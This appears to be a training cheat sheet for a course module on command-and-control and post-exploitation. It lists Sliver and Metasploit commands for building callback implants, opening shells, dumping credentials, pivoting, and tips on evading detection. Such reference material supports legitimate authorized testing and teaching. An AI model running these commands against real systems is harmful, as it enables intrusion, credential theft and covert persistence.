---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — Command & Control and Post-Exploitation

*Companion to [Module 13 — Command & Control and Post-Exploitation](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only operate C2 against systems you own or have explicit written permission to test.

## Sliver — server and operator console

```bash
sliver-server                     # start the server (drops you into the console)
# inside the console:
help                              # command list
version                           # server/client versions
players                           # multiplayer operators
```

## Sliver — generating and staging implants

```text
# stageless session implant (one self-contained binary)
generate --mtls YOUR_IP:8888 --os windows --arch amd64 --save /tmp/

# beacon (periodic check-in — the operational default; quieter than a live session)
generate beacon --mtls YOUR_IP:8888 --seconds 60 --jitter 30 --os windows

# start the matching listener BEFORE you run the implant
mtls --lport 8888
http --lport 80                   # HTTP(S) C2 profile
implants                          # list built implants
```

## Sliver — sessions, beacons, and interacting

```text
sessions                          # live, interactive sessions
beacons                           # periodic beacons
use <id>                          # interact with a session/beacon
# inside an interacted implant:
info                              # host / user / pid
whoami | getuid | pwd | ls
execute -o whoami                 # run a command, capture output
shell                             # interactive shell (loud — use sparingly)
upload local.exe C:\\Temp\\x.exe
download C:\\Users\\admin\\loot.zip
```

## Sliver — post-exploitation & movement

```text
ps                                # process list
migrate <pid>                     # move the implant into another process
screenshot
getsystem                         # attempt SYSTEM (Windows)
portfwd add -b 127.0.0.1:3389 -r 10.0.0.5:3389    # pivot a port through the implant
socks5 start                      # SOCKS proxy through the implant for other tools
```

## Metasploit post-exploitation (meterpreter)

```text
sessions -i 1                     # enter a session
sysinfo | getuid | getprivs       # host · user · privileges
ps ; migrate <pid>                # relocate into a stabler process
hashdump                          # dump local SAM hashes
run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester    # find local privesc
load kiwi ; creds_all             # in-memory credential harvesting (mimikatz)
portfwd add -l 3389 -p 3389 -r 10.0.0.5          # pivot
```

## Gotchas worth remembering

- **A beacon is not a live shell — and that's the point.** It checks in on an interval with jitter and sleeps between; low, irregular check-ins are what keep C2 under the radar. Reach for an interactive `shell`/`session` only when you truly need real-time, and expect it to be far louder.
- **You generate the exact telemetry the blue team hunts.** Beacon *timing* (regular intervals = a machine, not a human) and the TLS fingerprint (JA3/JA3S) are classic C2 tells. Tune `--seconds`/`--jitter` and know that the SOC is looking for the periodicity you create.
- **`migrate` for stability and stealth, but it's risky.** Moving into a long-lived process survives the initial exploit dying and blends in — but a failed migration loses your session. Migrate into something plausible for the user context, not a random SYSTEM process.
- **Prefer in-memory and built-ins over dropping files.** `execute`, `load kiwi`, and SOCKS-through-implant avoid touching disk; every uploaded binary is an artifact and a hash for defenders to catch.
- **Sliver is OSS and free; the tradecraft transfers.** The commercial frameworks differ in polish, not concept — beacon/listener/implant, pivot, harvest, migrate is the same operator loop everywhere.
